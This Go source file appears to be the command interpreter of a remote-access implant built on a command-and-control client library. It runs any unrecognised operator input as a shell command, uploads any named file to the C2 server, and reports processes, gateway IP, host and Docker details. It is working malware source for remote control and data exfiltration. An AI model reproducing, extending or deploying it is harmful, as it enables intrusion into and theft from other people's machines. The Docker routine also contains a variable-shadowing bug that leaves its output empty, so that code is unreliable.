package interpreter

import (
	"agent/config"
	"common/debug"
	"common/machine"
	"common/sec"
	"common/slices"
	"crypto/md5"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"offsec"
	"os"
	"runtime"
	"strings"

	"github.com/shirou/gopsutil/v3/cpu"
	"github.com/shirou/gopsutil/v3/docker"
	"github.com/shirou/gopsutil/v3/host"
	c2api "github.com/zarkones/xena-client"
)

func hashWithAgentID(text string) string {
	hash := md5.Sum([]byte(config.AgentID + text))
	return hex.EncodeToString(hash[:])
}

func Interpret(input string) (output string) {
	debug.Println("Command Received:", input)

	output = offsec.Init(input)
	if output != "" {
		return output
	}

	switch input {

	case "/gateway-ip":
		addr, err := sec.GetGatewayIP()
		if err != nil {
			return "Error: " + err.Error()
		}
		return addr

	case "/processes":
		processes, err := sec.Processes()
		if err != nil {
			return err.Error()
		}
		o := make([]string, len(processes))
		i := 0
		for name, pids := range processes {
			o[i] = name + ": " + fmt.Sprint(pids)
			i++
		}
		return strings.Join(o, "\n")

	case "/pubsub-enable":
		config.PubSubEnabled = true
		return "PubSub Enabled"
	case "/pubsub-disable":
		config.PubSubEnabled = false
		return "PubSub Disabled"
	case "/pubsub-status":
		if config.PubSubEnabled {
			return "PubSub is Enabled"
		}
		return "PubSub is Disabled"

	case "/about":
		return about()

	case "/docker":
		return dockerDetails()

	case "/ls":
		fbCtx := ls()
		jsonFbCtx, err := json.Marshal(&fbCtx)
		if err != nil {
			return `{"err":"failed to serialize file browser contract"}`
		}
		return string(jsonFbCtx)
	}

	// Navigating File Browser.
	cdCmd := "/cd:"
	if strings.HasPrefix(input, cdCmd) {
		cdIntoPath := strings.TrimPrefix(input, cdCmd)
		wd = cdIntoPath
		return "File Browser At: " + wd
	}

	// File upload request.
	fileUploadCmd := "/upload:"
	if strings.HasPrefix(input, fileUploadCmd) {
		idAndFilePath := strings.TrimPrefix(input, fileUploadCmd)
		chunks := strings.Split(idAndFilePath, ";")
		if len(chunks) != 2 {
			return "Failed to parse /upload command"
		}
		fileID := chunks[0]
		filePath := chunks[1]
		fileContent, err := os.ReadFile(filePath)
		if err != nil {
			return "Failed to read designated file:" + err.Error()
		}
		if err := c2api.UploadFile(fileID, &fileContent); err != nil {
			return "Failed to upload the file:" + err.Error()
		}
		return "Filed successfuly uploaded"
	}

	// Run in shell:
	output, err := machine.RunTerminal(input)
	if err != nil {
		output = output + "\n" + err.Error()
	}
	if output == "" {
		output = "[Shell Command Returned No Output]"
	}
	return output

}

func about() (output string) {
	cpus := []string{}
	i, _ := cpu.Info()
	for _, cpu := range i {
		cpus = append(cpus, cpu.ModelName)
	}
	cpus = slices.Deduplicate(cpus)

	kerVer, err := host.KernelVersion()
	if err != nil {
		kerVer = err.Error()
	}

	virSys, virRole, err := host.Virtualization()
	if err != nil {
		virSys = err.Error()
		virRole = err.Error()
	}

	uptime := ""
	uptimeCounter, err := host.Uptime()
	if err != nil {
		uptime = err.Error()
	} else {
		uptime = fmt.Sprint(uptimeCounter)
	}

	output += "OS: " + runtime.GOOS
	output += "\nArch: " + runtime.GOARCH
	output += "\nCPUs: " + strings.Join(cpus, ", ")
	output += "\nCPU cores: " + fmt.Sprint(runtime.NumCPU())
	output += "\nKernel Ver.: " + kerVer
	output += "\nVirtualization System: " + virSys
	output += "\nVirtualization Role: " + virRole
	output += "\nUptime: " + uptime

	return output
}

func dockerDetails() (output string) {
	containers, err := docker.GetDockerStat()
	if err != nil {
		return err.Error()
	}

	for _, container := range containers {
		output := "\nContainerID: " + container.ContainerID
		output += "\nName: " + container.Name
		output += "\nImage: " + container.Image
		output += "\nStatus: " + container.Status
		output += "\nRunning: " + fmt.Sprint(container.Running)
	}

	output = strings.TrimPrefix(output, "\n")
	output = strings.TrimSuffix(output, "\n")

	return output
}
